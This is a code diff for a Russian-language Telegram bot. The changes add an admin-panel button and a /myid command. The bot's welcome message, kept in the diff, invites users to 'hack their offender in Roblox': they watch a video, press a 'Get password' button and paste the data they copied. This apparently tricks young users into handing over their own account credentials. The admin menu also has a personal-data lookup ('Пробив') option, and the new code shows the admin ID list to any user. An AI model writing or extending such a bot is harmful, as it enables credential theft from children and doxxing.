@@ -281,35 +281,49 @@ def send_welcome(message):
         if referrer:
             referrer_id = referrer[0]
             if add_user_to_database(user_id, username, referral_code, referrer_id):
-                 send_main_menu(message.chat.id)
+                 send_main_menu(message.chat.id, user_id)
             else:
-                 send_main_menu(message.chat.id)
+                 send_main_menu(message.chat.id, user_id)
                  bot.send_message(message.chat.id, "Упсс.. Вы уже воспользовались ботом!")
                  return
         else:
            if add_user_to_database(user_id, username, "start"):
-               send_main_menu(message.chat.id)
+               send_main_menu(message.chat.id, user_id)
            else:
-                send_main_menu(message.chat.id)
+                send_main_menu(message.chat.id, user_id)
                 return
     else:
          if add_user_to_database(user_id, username, "start"):
-              send_main_menu(message.chat.id)
+              send_main_menu(message.chat.id, user_id)
          else:
-             send_main_menu(message.chat.id)
+             send_main_menu(message.chat.id, user_id)
              return
 
-def send_main_menu(chat_id):
+def send_main_menu(chat_id, user_id=None):
     """Отправляет главное меню с кнопками."""
-    markup = generate_main_keyboard()
-    bot.send_message(chat_id, "Привет! Хочешь взломать обидчика в Roblox? Тебе к нам! Посмотри этот видео-ролик, в нём рассказано, как получить данные твоего обидчика, как досмотришь видео, нажимай кнопку: Получить пароль ниже и вставляй сюда копируемые тобой данные.https://youtu.be/m3wfiX3o9Eo", reply_markup=markup)
+    markup = generate_main_keyboard(user_id)
+    welcome_text = (
+        "👋 Привет! Хочешь взломать обидчика в Roblox? Тебе к нам!\n\n"
+        "📺 Посмотри этот видео-ролик, в нём рассказано, как получить данные твоего обидчика.\n"
+        "Как досмотришь видео, нажимай кнопку 'Получить пароль' ниже и вставляй сюда копируемые тобой данные.\n\n"
+        "🎥 https://youtu.be/m3wfiX3o9Eo"
+    )
+    bot.send_message(chat_id, welcome_text, reply_markup=markup)
 
-def generate_main_keyboard():
-    """Создает клавиатуру с кнопками 'Получить пароль', 'Профиль' и 'Чат'."""
-    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+def generate_main_keyboard(user_id=None):
+    """Создает клавиатуру с кнопками. Для админов добавляет кнопку админ-панели."""
+    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=False)
     button_get_pass = telebot.types.KeyboardButton(text='Получить пароль')
     button_profile = telebot.types.KeyboardButton(text='Профиль')
-    markup.add(button_get_pass, button_profile)
+    
+    # Проверяем является ли пользователь админом
+    if user_id and (user_id in admin_ids or is_user_admin(user_id)):
+        button_admin = telebot.types.KeyboardButton(text='⚙️ Админ-панель')
+        markup.add(button_get_pass, button_profile)
+        markup.add(button_admin)
+    else:
+        markup.add(button_get_pass, button_profile)
+    
     return markup
 
 @bot.message_handler(func=lambda message: message.text == "Получить пароль")
@@ -342,6 +356,11 @@ def handle_profile_button(message):
        bot.send_message(message.chat.id, profile_message)
     else:
         bot.send_message(message.chat.id, "Упс.. Что-то пошло не так!")
+
+@bot.message_handler(func=lambda message: message.text == "⚙️ Админ-панель")
+def handle_admin_panel_button(message):
+    """Обработчик кнопки админ-панели"""
+    admin_panel(message)
 
 
 
@@ -520,6 +539,19 @@ def admin_panel(message):
         button_probiv = telebot.types.KeyboardButton(text='🔍Пробив')
         markup.add(button_users, button_broadcast, button_ban, button_unban, button_add_admin, button_remove_admin, button_probiv)
         bot.send_message(message.chat.id, "Админ-панель", reply_markup=markup)
+    else:
+        bot.reply_to(message, f"❌ У вас нет прав.\n\nВаш ID: {message.from_user.id}\nАдмин IDs: {admin_ids}")
+
+@bot.message_handler(commands=['myid'])
+def show_my_id(message):
+    """Показывает ID пользователя и список админов"""
+    bot.reply_to(
+        message, 
+        f"🆔 Ваш Telegram ID: `{message.from_user.id}`\n"
+        f"👥 Админы: {admin_ids}\n"
+        f"✅ Вы админ: {'Да' if message.from_user.id in admin_ids else 'Нет'}",
+        parse_mode='Markdown'
+    )
 
 @bot.message_handler(func=lambda message: message.text == "👩‍👦Люди")
 def handle_users_button(message):
